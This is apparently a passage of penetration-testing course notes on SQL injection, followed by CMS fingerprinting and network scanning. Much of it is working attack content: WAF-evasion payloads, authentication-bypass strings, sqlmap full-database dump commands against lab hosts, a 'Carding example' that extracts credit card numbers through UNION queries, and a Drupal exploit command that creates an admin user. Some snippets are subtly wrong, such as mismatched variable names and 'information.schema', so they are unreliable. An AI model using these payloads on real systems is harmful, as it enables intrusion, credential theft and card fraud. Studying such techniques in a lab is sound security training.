>NOTE: This example may seem unlikely due to the use of dynamic SQL to log in a user, but consider a dynamic reporting query where the user selects the columns to view. The user could insert malicious code into this scenario and compromise the data.

* Consider the following SQL Server Stored Procedure:

    ```css
    Create
    procedure get_report @columnamelist varchar(7900)
    As
    Declare @sqlstring varchar(8000)
    Set @sqlstring  = ‘
    Select ‘ + @columnamelist + ‘ from ReportTable‘
    exec(@sqlstring)
    Go 
    ```

* User input:

* This will result in the report running and all users’ passwords being updated.
    ```css 
    1 from users; update users set password = 'password'; select *
    ```
##  <a name="4.10"></a>4.10 Automated Exploitation

* Most of the situation and techniques presented here can be performed in a automated way using some tools. In this article the tester can find information how to perform an automated auditing using SQLMap:
    ```css
    https://www.owasp.org/index.php/Automated_Audit_using_SQLMap
    ```
##  <a name="4.11"></a>4.11 SQL Injection signature Evasion Techniques

* The techniques are used to bypass defenses such as Web application firewalls (WAFs) or intrusion prevention systems (IPSs). Also refer to https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF

## <a name="4.12"></a>4.12 White Space  
* Dropping space or adding spaces that won't affect the SQL statement. For example
    ```css
    or 'a'='a' 
    or 'a'  =    'a'
    ```
* Adding special character like new line or tab that won't change the SQL statement execution. For example,

    ```css 
    or 
    'a'=
    'a'  
    ```

## <a name="4.13"></a>4.13 Null Bytes 

* Use null byte (%00) prior to any characters that the filter is blocking.

* For example, if the attacker may inject the following SQL
    ```css
    ' UNION SELECT password FROM Users WHERE username='admin'-- 
    ```
    to add Null Bytes will be
    ```css
    %00' UNION SELECT password FROM Users WHERE username='admin'--
    ```

# <a name="4.14"></a>4.14 SQL Comments 

* Adding SQL inline comments can also help the SQL statement to be valid and bypass the SQL injection filter. Take this SQL injection as example.

    ```css
    ' UNION SELECT password FROM Users WHERE name='admin'-- 
    ```

* Adding SQL inline comments will be.
    ```css
    '/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--
    '/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'-- 
    ```

## <a name="4.15"></a>4.15 URL Encoding 
* Use the online URL encoding to encode the SQL statement
    ```css
        http://meyerweb.com/eric/tools/dencoder/
    ```
    ```css
    ' UNION SELECT password FROM Users WHERE name='admin'--
    ```
* The URL encoding of the SQL injection statement will be

    ```css
    %27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27-- 
    ```


## <a name="4.16"></a>4.16 Character Encoding :

```css
Char() function can be used to replace English char. For example, char(114,111,111,116) means root
 -->

<!-- 
' UNION SELECT password FROM Users WHERE name='root'--
To apply the Char(), the SQL injeciton statement will be
 -->

<!-- 
' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--

```

## <a name="4.17"></a>4.17 String Concatenation

* Concatenation breaks up SQL keywords and evades filters. Concatenation syntax varies based on database engine. Take MS SQL engine as an example
    ```css
    select 1
    ```
* The simple SQL statement can be changed as below by using concatenation
    ```css
    EXEC('SEL' + 'ECT 1')
    ```
## <a name="4.18"></a>4.18 Hex Encoding

* Hex encoding technique uses Hexadecimal encoding to replace original SQL statement char. For example, 'root' can be represented as 726F6F74
    ```css
    Select user from users where name = 'root'
    ```

* The SQL statement by using HEX value will be:

    ```css
        Select user from users where name = 726F6F74
    ```
    ```css
        Select user from users where name = unhex('726F6F74')
    ```
## <a name="4.19"></a>4.19 Declare variables

* Declare the SQL injection statement into variable and execute it.

* For example, SQL injection statement below
    ```css
    Union Select password
    ```
* Define the SQL statement into variable SQLivar
    ```css
    ; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password'); 
    EXEC(@SQLivar) 
    ```
* Alternative Expression of 'or 1 = 1'
    ```css

    OR 'SQLi' = 'SQL'+'i'
    OR 'SQLi' > 'S'
    or 20 > 1
    OR 2 between 3 and 1
    OR 'SQLi' = N'SQLi'
    1 and 1 = 1
    1 || 1 = 1
    1 && 1 = 1 
    ```
* While performing SQL Injection, you will need to sometimes comment out rest of the query after the payload. Here's how you can do that:

* In case of input field:

    * You need to enter a space, then two hyphens and then again a space after the payload.
    * For example: 
    ```css
    password' or '1' = '1' -- 
    ```
    * If the above method doesn't work, you can try entering a hash after the payload.
    * For example: 
        ```css
        password' or '1' = '1'#
        ```
* In case of URL:

    * When you add a space at the end of a URL, it doesn't get registered in the query, so you can't just type space, two hyphens and then space at the end of a URL.

    * The plus sign (+) is the URL encoded form a space. so to comment out rest of the query in a URL, you have to type space, two hyphens and then a plus sign after the payload.
    * For example: 
        ```css    
            something' or '1' = '1' --+
            Some common expressions :
            Username: admin Password: ' or 'a'='a
            Username: admin Password: ' or 1=1-- +
            Username: admin Password: ' or 'abcd'='abcd’-- +
            Username: admin Password: ' or 3=4-1--
            Username: admin Password: ' or 0=0# 
        ```
## <a name="4.20"></a>4.20 GET based sqli

* Now that we have come to the end of this topic, you should be able to:
* Understand SQL queries via GET parameters
* Perform basic union based SQL Injections
* Understand basic challenges faced during union based SQL injections
* If you have doubts regarding any of the above-mentioned points, please go through the videos again.

    ```css
    sqlmap -u "15.206.92.42/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-1/details.php?house=gryffindor" -p "house" --cookie="PHPSESSID=hmmnmdtsjniiqh16s945a96d50;security=2AB566CA-68A5-FFF4-5DFC-B611E2A2790F" --dbs --dump-all --level=3
    ```


## <a name="4.21"></a>4.21 union based sqli
```css
[URL]/?house='someparameter' 'union select username,password from users--+
```
```css
sqlmap -u "http://15.206.92.42/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1" -p "category" --cookie="PHPSESSID=hmmnmdtsjniiqh16s945a96d50;security=2AB566CA-68A5-FFF4-5DFC-B611E2A2790F" --dbs --dump-all --level=3
```
```css
[URL]/?category=1 union select id,id,username,password from users--+
```

## <a name="4.22"></a>4.22 Information_Schema() This is accesible

This contains all the information about the databases and their table and columns.
```css
sqlmap -u "http://15.206.92.42/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=2" -p "dept_id" --cookie="PHPSESSID=hmmnmdtsjniiqh16s945a96d50;security=2AB566CA-68A5-FFF4-5DFC-B611E2A2790F" --dbs --dump-all --level=3
```
## <a name="4.23"></a>4.23 Carding example:
```css 
Solution for SQLmap
Step 1: Go to the hacking challenge (The URL will be different for each user). http://13.233.238.136/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/
Step 2: Now open SQLmap on the command prompt( press windows+r and type cmd, then press Enter key) or terminal.
Step 3: Now click on any of the ‘Departments’ given on the challenge page to gain complete URL like this: http://13.233.238.136/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=1
Step 4: Enter the command given below along with the complete URL
python sqlmap.py -u http://13.233.238.136/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=1 --dbs --dump-all


Solution for the manual approach
Step 1: Go to the hacking challenge (The URL will be different for each user). http://13.233.238.136/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/
Step 2: Enter the query given below in the URL:
details.php?dept_id=1) union select 1,2,3,4--+
Now press enter. It will give you the vulnerable columns.
Step 3: Now for finding tables, copy this in the browser:
details.php?dept_id=2)union select 1,group_concat(table_name),3,4 from information.schema.table_constraints--+
Step 4: To find columns in the table, enter the query given below in the URL:
details.php?dept_id=2)%20union%20select%201,database(), group_concat(column_name),4%20from%20information_schema.columns%20where%20table_name=%27users_credit_cards%27--+
Step 5: To extract data from the database open this url: http://13.233.238.136/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=2)%20union%20select%201,database(),group_concat(id,0x3a,card_number),4%20from%20users_credit_cards--+ (You will have to customaize it for the IP address you have in your URL)
```

## <a name="4.24"></a>4.24 Burp

* This is used to setup internal proxy and captures all the requests.

*  3 types of SQL Injections used:

    1. Basic Authentication Bypass
    2. GET based SQL Injections
    3. POST based SQL Injections

* Practicing these SQL Injection methods are good to get you started. But there are other SQL Injection methods that you should know of. So we will briefly explain 3 more SQL Injection methods which you may encounter while researching or practicing.

## <a name="4.25"></a>4.25 Error Based SQL Injections
* Sometimes, we cannot exploit SQL Injection vulnerabilities simply by using UNION command. This may be because of some security checks in place or because of the complexity of the code. So to perform error based SQL injections, we make websites to throw SQL errors through which we can extract critical information. Now, different database servers employs different approach of performing error based SQL injections as the errors they throw are different in nature.

* For better understanding, let us have a look at the example below:

    * In Microsoft SQL server, there is an SQL function called convert(), which is used to convert the second parameter to the data type given in the first parameter.
    Have a look at the syntax: convert(`<data type>,<value>`)

    * This means, if we use convert`(int,’145’)`, the output will be 145.
    But, what if we try to convert a value which is not a valid data type like this convert`(int,’abcd’)`
    * As you might have expected, the server will throw an error saying:
    * “Cannot convert string ‘abcd’ into an int”

    * So, our motive is to perform SQL injection. This means, instead of using convert(int,’abcd) we ask the SQL server to convert(int,db_name()). As you know, db_name() is same as database() and suppose the database name is ‘secret_database’. If we try to convert it, the server will throw an error saying:
    * “Cannot convert ‘secret_database’ into int”

* Now, if a website throws a message that shows SQL errors, this means we can definitely perform SQL injection here. Using SQL injection, we can easily retrieve the name of the database. And once the database name is known we can easily fetch the names of the tables, columns and finally the data too. These SQL injections are referred to as Error based SQL injection, where we perform SQL injections when a web application throws an SQL error.

## <a name="4.26"></a>4.26 Boolean Based Blind Injections
* To understand the injection, let’s fragment it as Boolean + Blind Injections.
So, Boolean in terms of programming simply means True or False. This means, while performing these injections, we might be asking server to respond us as either true or false.
* Now, the second part is Blind Injections or Blind SQL injections. As the name suggests, these injections are used where we are successfully able to fetch critical data but somehow the extracted data is not visible on the website (hence, the name blind), which may be attributed to how the website is build.
So, combining both these parts, in Boolean based blind injections, we perform SQL injections by asking server True or False questions and on the basis of the response, we can extract crucial information.
* Let’s have a look at the example below:
* Suppose, If we want to fetch name of a student from a website, we will simply use this SQL query
    ```css
    Select name from students where id=121
    ```
* The output will be the name of the student against the id 121.
Now, to perform Boolean based blind injections, we use AND operator. Have a look at the query below where we have used boolean based blind injection to fetch the name of the student.
    ```css
    Select name from students where id=121 AND 1=1+
    ```
* As 1 equals to 1 us universally true, the output will fetch the name of the student. So, how is this injection different from others as we are just extracting the same information in a different way.
Well, what if we use this query instead.

    ```css
    Select name from students where id=121 AND 1=0+
    ```
* Now, 1 can never be equal to zero, this means the output will be blank. So, in such cases boolean based blind injections comes into play. This is how the query will look like:
    ```css
    Select name from students where id=121 AND (get_first_character_of(password))=’a’--+
    ```
* Look carefully, this time we are asking server to tell us the first character as ‘true’ or ‘false’. If the output shows the student name, this means the  password starts from ‘a’ and we can proceed further in a similar way to fetch the complete password and if there is no output, it means that the password must start with some other letter. This is how, Boolean based Blind Injections are performed.

# <a name="4.27"></a>4.27 Time Based Blind Injections
* These injections are used in those cases where we fail to extract data either by using UNION or ERROR based SQL injections and can neither ask a website questions as True or False. So, in order to extract critical information, we tamper with the server response time.
* Whenever a request is made to the server, it takes some time to fetch the information and deliver it to us, this is called as response time. Now, if we tamper with this response time, we can extract some crucial information.

* The syntax of Time based Blind injections is similar to Boolean based blind injections. Have a look at the query for time based blind injections.
    ```css 
    Select name from students where id=121 AND (if the 1st character of the password = ‘a’ then sleep for 10 seconds)--+
    ```
* Here, you can see, we are asking the server to tell us the first character of the password. If the password starts from ‘a’, the server will sleep for 10 seconds, which means increase in response time by 10 seconds. And, if the password does not start with ‘a’, the server will take it’s usual response time. In a similar way, we can predict the whole password. This is how, Time based blind injections are performed.

* Using this injection has lot of disadvantages. Firstly, as you can see every time we are making a request to server, it sleeps for 10 seconds. This means, this injection will take a lot of time. Secondly, the response time is also dependent on the speed of the internet. If the connection drops in between, it will increase the response time and hence will lead to faulty results.

Quick Questions:

* Understand the basic reasoning behind Error based SQL Injections, Boolean based SQL Injections and Time based SQL Injections.

## <a name="4.28"></a>4.28 Challenge
```html
Solution for manual approach
Step 1: Go to the URL to access the lab (The URL may be different for each user). http://13.233.238.136/SQL-Injection/Post-Based-SQL-Injection-Variant-2/
Step 2: Now enter the given credentials (Username: test2@test.com; Password: pass).
Step 3: Open Burp Suite, and turn on the intercept.
Step 4: Now choose any city and click on the ‘search’ icon to intercept the request, and send this request to repeater(ctrl+r)
Step 5: The request will look like this:

POST /SQL-Injection/Post-Based-SQL-Injection-Variant-2/details.php HTTP/1.1
Host: 13.233.238.136
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://13.233.238.136/SQL-Injection/Post-Based-SQL-Injection-Variant-2/search.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Cookie: key=DCB34BF8-2FBD-D315-854D-9BE47ECD2D45; PHPSESSID=8pp7sggilpa14i8nq267jjig26
Connection: close
Upgrade-Insecure-Requests: 1

city=Delhi

Step 6: Now add this query to the City=Delhi parameter:
city=Delhi' order by 7--+
Click on Go.
Right click under the ‘Response’ section and choose ‘show response to browser’ option to view the response.
Step 7: Now to find vulnerable columns enter this query:
city=Delhi' union select 1,2,3,4,5,6,7--+
It will give you three columns (2,5,6) and these are our injection points.
Step 8: Now to find tables, enter this query:
city=Delhi' union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.table_constraints--+
Then click on Go and then again click on ‘show response in browser’.

Solution using SQLmap

Step 9: Now proceed further on your own.

Step 1: Open Burp Suite and intercept the request as you have done previously in the manual approach.

Step 2: Add * to the query:
city=Delhi*

Step 3: Now copy the request and save it in a notepad file in the SQLmap directory by the name anyname.txt

Step 4: Open SQLmap in the terminal or command prompt.

Step 5: Now enter this command:
python sqlmap.py -r filename.txt --dbs

Step 6: It will ask you for several options to choose from, accordingly and learn about SQLmap.
If you do not understand which option to choose in any condition, you may simply press Enter.

Step 7: Once this is done, enter this command to find tables:

sqlmap -r filename.txt -D SQL_Injection_V7 --tables

(Here, SQL_injection_V7- is the name of the database, which may vary)

Step 8: To fetch columns enter this command:

sqlmap -r checksql.txt -D SQL_Injection_V7 -T users --columns

(Here, SQL_injection_V7- is the name of the database, which may vary)

Step 9: Now to fetch data, enter this command:

sqlmap -r checksql.txt -D SQL_Injection_V7 -T users -C id,password,username --dump 

POST /SQL-Injection/Post-Based-SQL-Injection-Variant-2/details.php HTTP/1.1
Host: 13.232.238.59
User-Agent: Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://13.232.238.59/SQL-Injection/Post-Based-SQL-Injection-Variant-2/search.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Origin: http://13.232.238.59
DNT: 1
Connection: close
Cookie: PHPSESSID=f7f9u12j8hqsaqe2svc4pis1k4; key=2AB566CA-68A5-FFF4-5DFC-B611E2A2790F
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

city=Delhi* 

`Add * sign where the injection has to be made.`

POST /SQL-Injection/Post-Based-SQL-Injection-Variant-3/details.php HTTP/1.1
Host: 13.232.238.59
User-Agent: Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://13.232.238.59/SQL-Injection/Post-Based-SQL-Injection-Variant-3/search.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
Origin: http://13.232.238.59
DNT: 1
Connection: close
Cookie: PHPSESSID=f7f9u12j8hqsaqe2svc4pis1k4; key=2AB566CA-68A5-FFF4-5DFC-B611E2A2790F
Upgrade-Insecure-Requests: 1

sign=Scorpio*
```
#

# <a name="5.0"></a>5 Fingerprinting components

* search for CVE on
* [Cvedetails](cvedetails.com)

##  <a name="5.1"></a>5.1 Wordpress
* Automated tools
* wpseku
    `python3 wpseku.py -u "URL"`

* wpscan 
* wpvulndb
    Check wp vulnerability.

## <a name="5.2"></a>5.2 Drupal

* Automated tools
    * drup-scan
        ```
        ./droopescan scan drupal -u "
        ```
        * Injects new username and password
            ```
            python 34992.py -t http://52.66.196.205/Vulnerable-CMS/Variant-1/products/ -u admin123 -p pass123
            ```
* Robots.txt - One can find this file in the base directory of a website. This file is used by server administrators to disallow search engines like Google, Bing, etc. to record certain pages/folders as it may contain interesting folders and files which a developer is trying to hide.

* Phpinfo.php - This file is a common debug file in PHP applications that contains huge amount of information regarding the server.

* Users.xml - This file generally contains usernames and passwords which hackers may exploit.

* Backup.sql - This default file is crucial as it may contain complete database backup.

* Config.bak - This may be a configuration file that stores passwords and keys.

* error_log / error.log - This file contains all error logs of the server which can reveal vulnerabilities to hackers.

* server-status and server-info - These are common Apache page that contains server information.

* manager/html - This default url takes you to Tomcat login page that can further disclose sensitive server information.

* phpmyadmin - It is the login page for PHPmyadmin - a software used for managing SQL databases from the website. Exploiting a database can compromise all the data inside it.

* Apart from these, there are many more default files that you should check and search for. You might not be able to find these default files as they may have been restricted by server administrators.

## <a name="5.3"></a>5.3 Network mapping

```
nmap -T4 -A -v -Pn [ip-address]
```

* Scans in Nmap and their role:-

    * Intense scan: This scans top 1000 commonly used ports and then tries to find what exact service and version of that service is running in an open port. This scan also helps in detecting the type of operating system. 

    * Intense scan + UDP: Normal intense scan only scans TCP ports and using this scan, we can also scan UDP ports too.

    * Intense scan all ports: Instead of scanning only the 1000 common ports, this will scan all the possible ports 0-65535 (As it scans all the ports, this scan takes a lot of time to complete).

    * Intense scan no ping: This scan is used where firewalls are placed at the target.

    * Ping scan: This scan only checks if the host is reachable or not. The scan doesn’t scan any port.

    * Quick scan: This scans lesser ports and does no service version detection. It is faster than intense scan but can be a bit unreliable.

    * Quick scan plus:  It scans fewer ports (same as the quick scan) but does version detection. The scan is much more aggressive and hence can put a little stress on the network and be a bit unreliable.

    * Regular scan: Runs Nmap with default options i.e. simple port scanning and no service version detection. 

    * Slow comprehensive scan: It is an extremely slow scan that does deep level scanning with the highest accuracy and least stress on the network.

    Here is a list of some tools that are used for automating VAPT:

##  <a name="5.4"></a>5.4 Beware 
* A lot of times automated scanners may report a false positives. 

* Burp Suite Pro - Complete overall semi-automated VAPT for technical flaws such as SQLi, XSS, Command injection, CSRF, etc.
    
* Example
    * Right click on http history --> right click --> choose do an active scan here -->Scanner tab -->Scan queue 
        ```css
        Results:
        RED    -Critical
        White  -Critical but unkown
        Orange -High
        Yellow -Medium
        Gray   -Normal Information
        ```
* Check the Request and Response and read the explained vulnerability

* Acunetix - Completely automated VAPT with minimal human intervention (like for login pages) for overall bugs - technical or non technical.

* Nikto - Free open-source tool which is a bit old and is mainly used to find configuration issues on the web server.

    Example 
        ```bash
        nikto -host [ip-address]
        ```
* OWASP ZAP Proxy - Similar to Burp Suite, but available free of cost.

* Nessus - Completely automated VAPT for network-based and server-based vulnerabilities.

* Metasploit - One of the most widely used free tool containing various semi-automated modules to check for and exploit vulnerabilities.


* Since massive amount of research and testing goes into developing these tools, most of these are paid.
* But, most paid tools also have a free to use alternative.
This alternative may not be as user friendly as the paid version and may not generate impressive reports, but they can give you a hint of where to do manual attacks. BurpSuite community version that we have used in this training is a free alternative for the paid version called BurpSuite Pro.
